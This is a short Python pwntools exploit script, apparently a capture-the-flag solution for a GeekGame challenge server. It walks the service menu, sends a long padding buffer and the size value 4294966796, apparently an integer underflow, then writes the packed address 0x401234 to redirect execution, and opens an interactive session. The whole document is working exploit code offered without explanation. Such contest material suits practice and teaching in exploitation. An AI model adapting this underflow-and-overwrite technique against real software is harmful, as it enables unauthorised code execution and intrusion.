import pwn

host = 'prob12.geekgame.pku.edu.cn'
port = 10012

conn = pwn.remote(host, port)

token = input("your token = ")

conn.sendline((token + "\n").encode())
print(conn.recvuntil(b'4. quit\n'))
conn.send(b'\n1\n')
print(conn.recvline())
conn.send(b'1\n')
print(conn.recvline())
conn.send(b'472\n')
print(conn.recvline())
conn.send(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n')

print(conn.recvuntil(b'4. quit\n'))
conn.send(b'\n1\n')
print(conn.recvline())
conn.send(b'2\n')
print(conn.recvline())
conn.send(b'4294966796\n')
print(conn.recvline())
byte_data = pwn.p64(0x0000000000401234)
conn.send(byte_data)
print(conn.recvuntil(b'4. quit\n'))
conn.send(b'\n4\n')
conn.interactive()

conn.close()
